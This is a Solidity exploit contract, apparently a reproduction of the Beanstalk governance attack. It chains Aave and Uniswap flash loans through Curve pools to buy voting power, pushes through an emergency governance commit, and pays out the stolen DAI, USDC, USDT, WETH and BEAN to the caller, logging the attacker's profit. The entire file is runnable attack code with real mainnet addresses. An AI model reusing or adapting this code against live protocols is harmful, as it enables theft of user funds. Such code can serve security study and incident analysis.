pragma solidity ^ 0.8.0;
import "hardhat/console.sol";
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external ;
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;// returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns(uint);
}

interface IAAVEPool{
    function flashLoan(address,address[] calldata ,uint256[] calldata ,uint256[] calldata ,address onBehalfOf,bytes calldata ,uint16 referralCode) external;
}
interface IUniswapV2Pair{ //for uniswap flashloan
    function swap(uint , uint , address , bytes calldata ) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
    function burn(address) external;
}
interface ICRV{
    function add_liquidity( uint256[3] calldata, uint256) external;
    function add_liquidity( uint256[2] calldata, uint256) external;
    function exchange(int128, int128, uint256, uint256) external returns(uint);
    function remove_liquidity_one_coin(uint256, int128, uint256) external;
}
interface IBeanProtocol{
    enum FacetCutAction {Add, Replace, Remove}
    struct FacetCut {
        address facetAddress;
        FacetCutAction action;
        bytes4[] functionSelectors;
    }
    function propose(
        FacetCut[] calldata _diamondCut,
        address _init,
        bytes calldata _calldata,
        uint8 _pauseOrUnpause
    )
        external;
    function depositBeans(uint256) external;
    function vote(uint32) external;
    function emergencyCommit(uint32) external;
    function deposit(address, uint) external;
}
contract attack{
    address public beanTokenAddress         = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db;
    address public usdcAddress              = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public daiAddress               = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public usdtAddress              = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public crvDepositor             = 0xA79828DF1850E8a3A3064576f380D90aECDD3359;
    address public crvDTCPool               = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address public crvDTC                   = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address public lusdCrvAddress           = 0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA;
    address public lusdAddress              = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address public beanCrvAddress           = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
    address public beanLusdAddress          = 0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D;
    address public aavePoolAddress          = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address public beanProtocolAddress      = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;
    address public wethBeanUniPairAddress   = 0x87898263B6C5BABe34b4ec53F22d98430b91e371;
    address public wethAddress              = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public router                   = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public lusdOhmUniPairAddress    = 0x46E4D8A1322B9448905225E52F914094dBd6dDdF;
    address public weth                     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;


    function profit() public{
        //prepare
        IERC20(beanTokenAddress).approve(crvDepositor, type(uint).max);
        IERC20(usdcAddress).approve(crvDepositor, type(uint).max);
        IERC20(daiAddress).approve(crvDepositor, type(uint).max);
        IERC20(usdtAddress).approve(crvDepositor, type(uint).max);
        IERC20(usdcAddress).approve(crvDTCPool, type(uint).max);
        IERC20(daiAddress).approve(crvDTCPool, type(uint).max);
        IERC20(usdtAddress).approve(crvDTCPool, type(uint).max);
        IERC20(crvDTC).approve(lusdCrvAddress, type(uint).max);
        IERC20(lusdAddress).approve(lusdCrvAddress, type(uint).max);
        IERC20(crvDTC).approve(beanCrvAddress, type(uint).max);
        IERC20(beanTokenAddress).approve(beanLusdAddress, type(uint).max);
        IERC20(lusdAddress).approve(beanLusdAddress, type(uint).max);
        IERC20(usdcAddress).approve(beanProtocolAddress, type(uint).max);
        IERC20(beanCrvAddress).approve(beanProtocolAddress, type(uint).max);
        IERC20(beanLusdAddress).approve(beanProtocolAddress, type(uint).max);
        IERC20(beanTokenAddress).approve(beanProtocolAddress, type(uint).max);
        IERC20(usdcAddress).approve(aavePoolAddress, type(uint).max);
        IERC20(daiAddress).approve(aavePoolAddress, type(uint).max);
        IERC20(usdtAddress).approve(aavePoolAddress, type(uint).max);
        
        IERC20(beanTokenAddress).approve(beanCrvAddress, type(uint).max);
        IERC20(lusdAddress).approve(beanCrvAddress, type(uint).max);
        uint256 usdtBefore = IERC20(usdtAddress).balanceOf(msg.sender);
        uint256 usdcBefore = IERC20(usdcAddress).balanceOf(msg.sender);
        uint256 daiBefore = IERC20(daiAddress).balanceOf(msg.sender);
        uint256 wethBefore = IERC20(weth).balanceOf(msg.sender);
        uint256 beanBefore = IERC20(beanTokenAddress).balanceOf(msg.sender);

        console.log("Attack Start!");
        {
        address[] memory addrArray = new address[](3);
        addrArray[0] = daiAddress;
        addrArray[1] = usdcAddress;
        addrArray[2] = usdtAddress;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350*1e24;
        amounts[1] = 500*1e12;
        amounts[2] = 150*1e12;
        uint256[] memory types = new uint256[](3);
        IAAVEPool(aavePoolAddress).flashLoan(address(this),  addrArray,  amounts, types, address(this), new bytes(0), 0);
        }

        IERC20(wethBeanUniPairAddress).transfer(wethBeanUniPairAddress, IERC20(wethBeanUniPairAddress).balanceOf(address(this)));
        IUniswapV2Pair(wethBeanUniPairAddress).burn(address(this));

        IERC20(daiAddress).transfer(msg.sender, IERC20(daiAddress).balanceOf(address(this)));
        IERC20(usdcAddress).transfer(msg.sender, IERC20(usdcAddress).balanceOf(address(this)));
        IERC20(wethAddress).transfer(msg.sender, IERC20(wethAddress).balanceOf(address(this)));
        IERC20(usdtAddress).transfer(msg.sender, IERC20(usdtAddress).balanceOf(address(this)));
        IERC20(beanTokenAddress).transfer(msg.sender, IERC20(beanTokenAddress).balanceOf(address(this)));
        console.log("Attack complete!!!");
        uint usdtProfit = (IERC20(usdtAddress).balanceOf(msg.sender) - usdtBefore)/(10**IERC20(usdtAddress).decimals());
        uint daiProfit  = (IERC20(daiAddress).balanceOf(msg.sender) - daiBefore)/(10**IERC20(daiAddress).decimals());
        uint usdcProfit = (IERC20(usdcAddress).balanceOf(msg.sender) - usdcBefore)/(10**IERC20(usdcAddress).decimals());
        uint beanProfit = (IERC20(beanTokenAddress).balanceOf(msg.sender) - beanBefore)/(10**IERC20(beanTokenAddress).decimals());
        uint wethProfit = (IERC20(weth).balanceOf(msg.sender) - wethBefore)/(10**IERC20(weth).decimals());
        console.log("Attacker profit:");
        console.log("usdt:  %s USD", usdtProfit);
        console.log("dai:   %s USD", daiProfit);
        console.log("usdc:  %s USD", usdcProfit);
        console.log("bean:  %s USD", beanProfit);
        console.log("weth:  %s", wethProfit);
        console.log("total: %s USD and %s ETH", 
            usdtProfit + usdcProfit + daiProfit + beanProfit,
            wethProfit
        );
    }
    function bytesToAddress(bytes memory bys) public pure returns (address addr) {
      assembly {
        addr := mload(add(bys,20))
      }
    }
    function executeOperation(address[] calldata ,uint256[] calldata ,uint256[] calldata ,address ,bytes calldata ) external returns (bool){
        uint112 loan;
        (,loan,)= IUniswapV2Pair(wethBeanUniPairAddress).getReserves();
        IUniswapV2Pair(wethBeanUniPairAddress).swap(0, loan - 1, address(this), abi.encodePacked(beanTokenAddress));
        IUniswapV2Pair(wethBeanUniPairAddress).skim(address(this));
        ICRV(lusdCrvAddress).exchange(int128(0), int128(1), IERC20(lusdAddress).balanceOf(address(this)) , uint256(0));
        uint LPremain = IERC20(crvDTC).balanceOf(address(this));
        ICRV(crvDTCPool).remove_liquidity_one_coin(LPremain/2, 1, 0);
        ICRV(crvDTCPool).remove_liquidity_one_coin(LPremain*35/100, 0, 0);
        ICRV(crvDTCPool).remove_liquidity_one_coin(IERC20(crvDTC).balanceOf(address(this)), 2, 0);
        return true;
  }
    function uniswapV2Call(address , uint amount0, uint amount1, bytes calldata data) external{
        address token   = bytesToAddress(data);
        if(token == beanTokenAddress){
            uint112 loan;
            (loan,,) = IUniswapV2Pair(lusdOhmUniPairAddress).getReserves();
            IUniswapV2Pair(lusdOhmUniPairAddress).swap(loan - 1, 0, address(this), abi.encodePacked(lusdAddress)); 
            IUniswapV2Pair(lusdOhmUniPairAddress).skim(address(this));
            IERC20(token).transfer(msg.sender, amount1*103/100);
        }
        else if(token == lusdAddress){
            {
            uint DAIbalance = IERC20(daiAddress).balanceOf(address(this));
            uint USDCbalance = IERC20(usdcAddress).balanceOf(address(this));
            uint USDTbalance = IERC20(usdtAddress).balanceOf(address(this));
            uint256[3] memory amounts1;
            amounts1[0] = DAIbalance;
            amounts1[1] = USDCbalance;
            amounts1[2] = USDTbalance;
            ICRV(crvDTCPool).add_liquidity(amounts1, 0);
            }
            ICRV(lusdCrvAddress).exchange(int128(1), int128(0), amount0 , uint256(0));

            uint256[2] memory amounts2;
            amounts2[0] = 0;
            amounts2[1] = IERC20(crvDTC).balanceOf(address(this));
            ICRV(beanCrvAddress).add_liquidity(amounts2, 0);

            uint256[2] memory amounts3;
            amounts3[0] = IERC20(beanTokenAddress).balanceOf(address(this));
            amounts3[1] = IERC20(lusdAddress).balanceOf(address(this));

            ICRV(beanLusdAddress).add_liquidity(amounts3, 0);

            IBeanProtocol(beanProtocolAddress).deposit(beanCrvAddress, IERC20(beanCrvAddress).balanceOf(address(this)));
            IBeanProtocol(beanProtocolAddress).vote(18);
            IBeanProtocol(beanProtocolAddress).emergencyCommit(18);



            ICRV(beanCrvAddress).remove_liquidity_one_coin(IERC20(beanCrvAddress).balanceOf(address(this)), int128(1), 0);
            ICRV(beanLusdAddress).remove_liquidity_one_coin(IERC20(beanLusdAddress).balanceOf(address(this)), int128(1), 0);

            IERC20(token).transfer(msg.sender, amount0*103/100);
        }
    }
}
